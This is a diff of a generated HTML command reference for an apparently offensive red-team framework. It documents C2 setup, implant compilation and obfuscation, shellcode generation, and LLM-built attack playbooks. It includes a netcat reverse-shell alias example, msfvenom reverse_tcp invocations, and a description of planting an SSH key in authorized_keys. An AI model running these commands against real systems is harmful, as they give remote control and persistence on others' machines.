@@ -174,6 +174,8 @@
 </header>
 <h1 id="commands.md-documentation-by-readmeneitor.py">COMMANDS.md
 Documentation by readmeneitor.py</h1>
+<h2 id="main">main</h2>
+<p>No description available.</p>
 <h2 id="init"><strong>init</strong></h2>
 <p>Initializer for the LazyOwnShell class.</p>
 <p>This method sets up the initial parameters and scripts for an
@@ -205,6 +207,9 @@ successfully or an exception occurred. And feedback the red operation
 report.</p>
 <p>:param command: The command to be executed. :type command: str
 :return: None. :rtype: str</p>
+<h2 id="onecmd_plus_hooks">onecmd_plus_hooks</h2>
+<p>Intercepta comandos para expandir placeholders en aliases. Maneja
+tanto strings como objetos Statement.</p>
 <h2 id="one_cmd">one_cmd</h2>
 <p>Internal function to execute commands.</p>
 <p>This method attempts to execute a given command using
@@ -229,8 +234,16 @@ Software Foundation.</p>
 entered. You can override it in a subclass to change its behavior.</p>
 <p>Example: &gt;&gt;&gt; shell = LazyOwnShell() &gt;&gt;&gt;
 shell.emptyline() You didn’t enter any command.</p>
+<h2 id="load_user_commands">load_user_commands</h2>
+<p>Carga los comandos personalizados desde user_commands.json</p>
+<h2 id="save_user_command">save_user_command</h2>
+<p>Guarda un nuevo comando en user_commands.json</p>
 <h2 id="list_files_in_directory">list_files_in_directory</h2>
 <p>Lista todos los archivos en un directorio dado.</p>
+<h2 id="register_tool_commands">register_tool_commands</h2>
+<p>Registra automáticamente todos los comandos .tool en la carpeta
+‘tools/’ Usa self.params para reemplazar {ip}, {port}, {domain}, {s},
+etc.</p>
 <h2 id="register_lua_command">_register_lua_command</h2>
 <p>Registra un comando nuevo desde Lua.</p>
 <h2 id="load_plugins">load_plugins</h2>
@@ -243,6 +256,19 @@ and registers enabled plugins as new commands.</p>
 <p>Registers a YAML plugin as a new command.</p>
 <p>This method creates a dynamic command based on the plugin’s
 configuration and assigns it to the application.</p>
+<h2
+id="register_all_adversary_commands">register_all_adversary_commands</h2>
+<p>No description available.</p>
+<h2 id="register_adversary_command">_register_adversary_command</h2>
+<p>No description available.</p>
+<h2 id="display_toastr">display_toastr</h2>
+<p>Display a toastr-like notification in the terminal with adaptive
+sizing.</p>
+<h2 id="wrap_text">_wrap_text</h2>
+<p>Helper method to wrap text to fit within specified width.</p>
+<h2 id="notify">notify</h2>
+<p>Command to trigger a toastr-like notification. Usage: notify <type>
+<message> Example: notify success Implant checked in!</p>
 <h2 id="eof">EOF</h2>
 <p>Handle the end-of-file (EOF) condition.</p>
 <p>This method is called when the user sends an end-of-file (EOF) signal
@@ -451,6 +477,14 @@ privileges.</p>
 discovery mode.</p>
 <p>This method executes the <code>lazynmap</code> script in discovery
 mode. It uses the current working directory for locating the script.</p>
+<p>:return: None</p>
+<h2 id="lazynmap-1">lazynmap</h2>
+<p>Runs the internal module <code>modules/lazynmap.sh</code> with target
+mode.</p>
+<p>This method executes the <code>lazynmap</code> script in target mode.
+It uses the current working directory for locating the script.</p>
+<p>:param line: The network ip to be used for scanning. :type line:
+str</p>
 <p>:return: None</p>
 <h2 id="lazysniff">lazysniff</h2>
 <p>Run the sniffer internal module located at
@@ -3454,26 +3488,30 @@ limit of results is taken from self.params[“limit”] if provided;
 otherwise, defaults to 10. Results are printed directly to the
 console.</p>
 <h2 id="c2">c2</h2>
-<p>Handles the execution of a C2 (Command and Control) server setup
-command.</p>
-<p>This function performs the following tasks: 1. Retrieves and
-validates the local host (lhost) and local port (lport) parameters. 2.
-Checks if the required file <code>modules/run</code> exists. 3. Reads
-the content of the <code>modules/run</code> file, replaces placeholders
-with actual values (lport, line, lhost), and copies the updated content
-to the clipboard. 4. Prompts the user to start the C2 server, and if
-confirmed, executes the server command. 5. Provides a warning about
-shutting down the server.</p>
-<p>Args: line (str): The victim ID or command line to be used by the C2
-server.</p>
+<p>Handle C2 server setup and agent compilation.</p>
+<p>This method manages the process of setting up a Command and Control
+(C2) server and compiling a corresponding agent for various
+platforms.</p>
+<p>Args: line (str): Specifies the victim ID and optional C2 server
+configurations. - Victim ID: The identifier for the target agent. -
+Tunnel Option (optional): Append ‘1’ to use a Cloudflare tunnel. -
+Target Choice (optional): A number from ‘1’ to ‘7’ to specify the agent
+platform (default is ‘1’ for Windows PowerShell). - ‘1’: Windows
+PowerShell - ‘2’: Linux Shell - ‘3’: Windows Batch - ‘4’: macOS Shell -
+‘5’: Android Shell - ‘6’: iOS Shell - ‘7’: WebAssembly Shell - Tunnel
+Toggle (optional): After the victim ID and target choice, you can append
+‘1’ to enable the Cloudflare tunnel or ‘0’ to disable it.</p>
 <p>Returns: None</p>
 <p>Raises: None</p>
-<p>Example: c2 victim 1</p>
-<p>Notes: - Ensure that the <code>lhost</code> and <code>lport</code>
-parameters are valid before calling this function. - The
-<code>modules/run</code> file must exist and be correctly formatted. -
-The server command is executed using <code>os.system</code>, which may
-require additional handling for security.</p>
+<p>Example Usage: c2 victim-1 # Compiles a Windows PowerShell agent c2
+victim-2 2 # Compiles a Linux Shell agent c2 victim-3 1 1 # Compiles a
+Windows PowerShell agent with Cloudflare tunnel</p>
+<p>Notes: - Ensure the ‘lhost’ and ‘c2_port’ parameters are correctly
+set in the <code>payload.json</code> config file before calling this
+method. - The <code>modules/run</code> file and files in
+<code>modules/backdoor/</code> and <code>modules/rootkit/</code>
+directories must exist for the agent compilation process. - The go
+artifactory is ofuscated by garble if is installed</p>
 <h2 id="kick">kick</h2>
 <p>Handles the process of sending a spoofed ARP packet to a specified IP
 address with a given MAC address.</p>
@@ -5319,6 +5357,8 @@ credentials from a selected file. If “hash”, it uses a hash file for
 authentication. If neither, it displays an error message with usage
 instructions.</p>
 <p>Returns: None</p>
+<h2 id="certipy_ad">certipy_ad</h2>
+<p>No description available.</p>
 <h2 id="certipy">certipy</h2>
 <p>Executes the Certipy tool to interact with Active Directory
 Certificate Services.</p>
@@ -5629,12 +5669,12 @@ uploaded</p>
 <p>}()“} Some WAF can be bypassed with the use of unicode
 characters.</p>
 <pre><code>Generate an obfuscated payload, encode it in base64, and append the SSH public key to the authorized_keys file.
-    
+
     Args:
         ip_address (str): The IP address for the reverse shell connection.
         port (int): The port for the reverse shell connection.
         ssh_public_key (str): The SSH public key to add to authorized_keys.
-    
+
     Returns:
         str: The base64-encoded obfuscated payload.</code></pre>
 <h2 id="sqli_mssql_test">sqli_mssql_test</h2>
@@ -5810,6 +5850,11 @@ technique ID.</p>
 <p>Parameters: line (str): Command-line arguments (not used in this
 function).</p>
 <p>Returns: None</p>
+<h2 id="attack_plan">attack_plan</h2>
+<p>Executes a multi-step APT simulation plan based on Atomic Red Team
+test IDs.</p>
+<p>Parameters: line (str) optional: Path to the YAML plan file.</p>
+<p>Returns: None</p>
 <h2 id="mitre_test">mitre_test</h2>
 <p>Interacts with the MITRE ATT&amp;CK framework using the STIX 2.0
 format.</p>
@@ -5822,6 +5867,38 @@ actions, such as a tactic name or technique ID.</p>
 <p>Usage: mitre_test list # Lists all tactics and techniques mitre_test
 tactic <name> # Lists techniques for a specific tactic mitre_test
 technique <id> # Shows details of a specific technique</p>
+<h2 id="generate_playbook">generate_playbook</h2>
+<p>Generates a playbook that integrates Atomic Red Team tests and MITRE
+ATT&amp;CK techniques.</p>
+<p>This function creates a playbook by combining tests from the Atomic
+Red Team repository and techniques from the MITRE ATT&amp;CK framework.
+The playbook includes detailed information about each test and
+technique, making it a comprehensive resource for emulating adversary
+behaviors.</p>
+<p>Parameters: line (str): Command-line arguments for specifying the
+playbook name and optional filters. The filters can be applied to
+various attributes of the tests and techniques, including but not
+limited to: - name: Filter by the name of the test or technique. -
+description: Filter by keywords in the description of the test or
+technique. - mitre_id: Filter by the MITRE ATT&amp;CK technique ID. -
+platforms: Filter by the supported platforms (e.g., windows, linux,
+macos). - tactic: Filter by the MITRE ATT&amp;CK tactic associated with
+the technique. - data_sources: Filter by the data sources mentioned in
+the technique. - defensive_measures: Filter by the defensive measures
+mentioned in the technique. - examples: Filter by examples mentioned in
+the technique. - references: Filter by references or URLs mentioned in
+the technique. - related_techniques: Filter by related techniques
+mentioned in the technique. - mitigations: Filter by mitigations
+mentioned in the technique.</p>
+<p>Returns: None</p>
+<p>Example Usage: do_generate_playbook(“ExamplePlaybook persistence
+lateral_movement windows”) This command will generate a playbook named
+“ExamplePlaybook” that includes tests and techniques related to
+“persistence”, “lateral_movement”, and the “windows” platform.</p>
+<h2 id="my_playbook">my_playbook</h2>
+<p>Generates a playbook from your custom technique database. Usage:
+my_playbook <name> [filter] Example: my_playbook KerberosAttack password
+spray</p>
 <h2 id="bbot">bbot</h2>
 <p>Executes a BBOT scan to perform various reconnaissance tasks.</p>
 <p>This function leverages BBOT, a reconnaissance tool, to perform tasks
@@ -6258,6 +6335,10 @@ If not provided, the user will be prompted to enter one.</p>
 <p>Trasnform file .exe into binary file.</p>
 <p>Args: line (str): Ruta del archivo ejecutable .exe.</p>
 <p>Return shellcode.bin file in sessions directory</p>
+<h2 id="exe2donutbin">exe2donutbin</h2>
+<p>Trasnform file .exe into donut binary file.</p>
+<p>Args: line (str): path to the .exe.</p>
+<p>Return shellcode.bin file in sessions directory</p>
 <h2 id="atomic_lazyown">atomic_lazyown</h2>
 <p>Genera y ejecuta pruebas de Atomic Red Team usando el C2.</p>
 <p>Parameters: line (str): Lista de IDs de técnicas separadas por
@@ -6268,9 +6349,12 @@ espacios.</p>
 <p>Parameters: file_path (str): Ruta del archivo a subir.</p>
 <p>Returns: None</p>
 <h2 id="upload_c2">upload_c2</h2>
-<p>Exec command in the client using the C2.</p>
+<p>upload command in the client using the C2 to upload a file</p>
 <p>Parameters: command (str): client_id [optional], Command to exec.</p>
 <p>Returns: None</p>
+<h2 id="complete_upload_c2">complete_upload_c2</h2>
+<p>Autocomplete implant names from implant_config_*.json files in
+sessions/ directory</p>
 <h2 id="download_file_from_c2">download_file_from_c2</h2>
 <p>Descarga un archivo desde el C2.</p>
 <p>Parameters: file_name (str): Nombre del archivo a descargar. clientid
@@ -6281,15 +6365,22 @@ espacios.</p>
 <p>Parameters: line (str): Command input in the format “client_id
 file_name”.</p>
 <p>Returns: None</p>
+<h2 id="complete_download_c2">complete_download_c2</h2>
+<p>Autocomplete implant names from implant_config_*.json files in
+sessions/ directory</p>
 <h2 id="issue_command_to_c2">issue_command_to_c2</h2>
 <p>Ejecuta un comando en el cliente usando el C2.</p>
 <p>Parameters: command (str): Comando a ejecutar. client_id (str): ID
 del cliente (opcional).</p>
 <p>Returns: None</p>
 <h2 id="issue_command_to_c2-1">issue_command_to_c2</h2>
-<p>Exec command in the client using the C2.</p>
+<p>Exec command in the client using the C2. download: command you must
+put the file in sessions/temp_upload or use download_c2 command</p>
 <p>Parameters: command (str): client_id [optional], Command to exec.</p>
 <p>Returns: None</p>
+<h2 id="complete_issue_command_to_c2">complete_issue_command_to_c2</h2>
+<p>Autocomplete: 1st arg = implant name, 2nd arg = beacon command (with
+: if needed)</p>
 <h2 id="ofuscatorps1">ofuscatorps1</h2>
 <p>Obfuscates a PowerShell script using various techniques. by <span
 class="citation" data-cites="JoelGMSec">@JoelGMSec</span>
@@ -6655,9 +6746,133 @@ db lines (16 bytes per line) 4. Generate length calculation via
 shellcode_len</p>
 <p>Examples: Input: 4831c94881e9f6 Output: db
 0x48,0x31,0xc9,0x48,0x81,0xe9,0xf6</p>
+<h2 id="ai_playbook">ai_playbook</h2>
+<p>Generates an offensive playbook using: 1. Nmap scan results (CSV) 2.
+Custom knowledge base (JSON) 3. Local LLM analysis (Ollama)</p>
+<p>Usage: ai_playbook <csv_file> [playbook_name] [model_name] Example:
+ai_playbook nmap_results.csv ScepterAttack llama3</p>
+<h2 id="create_strict_yaml_prompt">_create_strict_yaml_prompt</h2>
+<p>Create a prompt that strictly enforces YAML response format without
+any narrative text</p>
+<h2 id="create_synthetic">create_synthetic</h2>
+<p>Create a basic synthetic playbook from Nmap CSV when LLM fails.</p>
+<p>Usage: create_synthetic <csv_file> [playbook_name] Example:
+create_synthetic nmap_results.csv SyntheticPlaybook</p>
+<h2 id="extract_yaml">extract_yaml</h2>
+<p>Extract YAML from an existing debug file and try to create a
+playbook.</p>
+<p>Usage: extract_yaml <debug_file> [playbook_name] Example:
+extract_yaml debug_AutoGeneratedPlaybook.txt MyPlaybook</p>
+<h2 id="img2vid">img2vid</h2>
+<p>Generates an MP4 video from PNG images found in the
+sessions/captured_images directory. This images are generated by the
+ofensive js code in the decoy site (When the blueteam try to visit our
+c2 and success login).</p>
+<p>The images are expected to have filenames in the format:
+capture_YYYYMMDD_HHMMSS.png. The video will be created in the current
+working directory as ‘output.mp4’. Requires ffmpeg to be installed and
+accessible in the system’s PATH.</p>
+<h2 id="convert_remcomsvc_from_file">convert_remcomsvc_from_file</h2>
+<p>Converts the Python REMCOMSVC byte string from remcomsvc.py to Golang
+byte slice format, prints a sample, and saves it to
+sessions/remcomsvc.go. see lazyaddon GoPEInjection Usage:
+convert_remcomsvc_from_file Return: Converts the Python REMCOMSVC byte
+string from remcomsvc.py to Golang byte slice format, prints a sample,
+and saves it to sessions/remcomsvc.go.</p>
+<h2 id="process_scans">process_scans</h2>
+<p>Processes CSV files with scan results and vulnerability data to
+generate a Shodan-like JSON database.</p>
+<p>Args: arg (Namespace): Arguments parsed by cmd2. Includes: directory
+(str, positional): The directory containing the CSV files.</p>
+<p>Returns: None</p>
+<p>Output: A JSON file named ‘surface_attack.json’ in the specified
+directory containing the processed data.</p>
+<h2 id="process_scan_csv">process_scan_csv</h2>
+<p>Processes a single scan CSV file.</p>
+<h2 id="process_vuln_csv">process_vuln_csv</h2>
+<p>Processes a single vulnerability CSV file.</p>
+<h2 id="adversary_yaml">adversary_yaml</h2>
+<p>Execute adversary from YAML in lazyadversaries/*.yaml Syntax:
+adversary [id] [l|r|n]</p>
+<h2 id="load_adversaries">_load_adversaries</h2>
+<p>No description available.</p>
+<h2 id="parse_adversary_args">_parse_adversary_args</h2>
+<p>No description available.</p>
+<h2 id="patch_template_if_needed">_patch_template_if_needed</h2>
+<p>No description available.</p>
+<h2 id="build_command_stack">_build_command_stack</h2>
+<p>No description available.</p>
+<h2 id="display_adversary_info">_display_adversary_info</h2>
+<p>No description available.</p>
+<h2 id="execute_commands">_execute_commands</h2>
+<p>No description available.</p>
+<h2 id="msfshellcoder">msfshellcoder</h2>
+<p>Generate shellcode in C format using msfvenom for either a custom
+command or a reverse shell payload. This command supports both direct
+argument input and interactive mode. It uses self.params for default
+values (lhost, lport, etc). Output is saved to sessions/ as a .txt file
+in C array format. Args: –payload (-p): MSF payload (e.g.,
+windows/x64/meterpreter/reverse_tcp). –command (-c): Custom command to
+encode into shellcode (e.g., ‘whoami’). –lhost (-H): Local IP for
+reverse shells. –lport (-P): Local port for reverse shells. –os (-o):
+Target OS: ‘windows’ or ‘linux’. –arch: Target architecture: ‘x86’ or
+‘x64’ (default: x64). Outputs: Saves shellcode to
+./sessions/shellcode_*.txt in C format. Uses self.cmd() to run system
+commands and self.display_toastr() for UI feedback. Examples:
+msfshellcoder -c “calc.exe” –os windows msfshellcoder -p
+linux/x64/shell_reverse_tcp -H 10.0.0.5 -P 4444 msfshellcoder # Launch
+interactive mode</p>
+<h2 id="pop">pop</h2>
+<p>Open a centered popup in the current tmux session to execute a shell
+command.</p>
+<p>If no command is provided via argument, prompts the user
+interactively. The popup remains open after command execution and waits
+for user acknowledgment via pressing ENTER, avoiding premature closure
+without requiring fixed sleep delays.</p>
+<p>Requirements: - Must be run inside an active tmux session (TMUX
+environment variable set). - Tmux server must be running.</p>
+<p>The command is executed in a bash shell within the popup. If tmux is
+not available or the environment is invalid, an error message is
+displayed and execution aborts.</p>
+<p>Args: line (str): The command to execute in the popup. If empty,
+prompts user input.</p>
+<h2 id="addalias">addalias</h2>
+<p>Add a new alias with support for placeholders like {rhost}, {lhost},
+{lport}, etc.</p>
+<p>Usage: addalias <name> <command></p>
+<p>Example: addalias myrev sh rlwrap nc {rhost} {lport} -e bash addalias
+scan run_script “lazyscripts/nmap_scan.ls {rhost}”</p>
+<h2 id="listaliases">listaliases</h2>
+<p>List all available aliases.</p>
+<h2 id="add2find">add2find</h2>
+<p>Add a new custom command to the ‘find’ system, saved in
+user_commands.json.</p>
+<p>Usage: add2find You will be prompted for: - Alias (descriptive name)
+- Command (the actual shell/command to execute)</p>
+<p>Example: Alias: LIN My Custom Recon Command: find / -name “*.log”
+2&gt;/dev/null</p>
+<p>The command will be available in ‘find’ immediately and persist
+across sessions.</p>
+<h2 id="rmfromfind">rmfromfind</h2>
+<p>Remove a custom command by index (as shown in ‘find’).</p>
+<p>Only removes user-added commands (not defaults).</p>
+<h2 id="aes_pe">aes_pe</h2>
+<p>Encrypt with AES and random key to PE EXE file, to usage with
+loaders.</p>
+<p>Usage: aes_pe You will be prompted for: - the PE Exe file
+(descriptive name)</p>
+<p>Example: aes_pe</p>
+<p>The files key.bin and cipher.bin will be available in ‘sessions’
+immediately and persist across the web server.</p>
+<h2 id="ai_toggle">ai_toggle</h2>
+<p>Enable or disable the IA assitant (use DeepSeek in local).</p>
 <h2 id="wrapper">wrapper</h2>
 <p>No description available.</p>
 <h2 id="wrapper_yaml">wrapper_yaml</h2>
+<p>No description available.</p>
+<h2 id="cmd_wrapper">cmd_wrapper</h2>
+<p>No description available.</p>
+<h2 id="show_toastr">show_toastr</h2>
 <p>No description available.</p>
 <h2 id="find_tgts">find_tgts</h2>
 <p>Finds and returns a list of target hosts with port 445 open in the
@@ -6842,5 +7057,7 @@ the scope where this function is used.</p>
 id="resolve_and_download_dependencies">resolve_and_download_dependencies</h2>
 <p>Recursively resolve and download package dependencies with enhanced
 checks</p>
+<h2 id="tool_wrapper">tool_wrapper</h2>
+<p>No description available.</p>
 </body>
 </html>
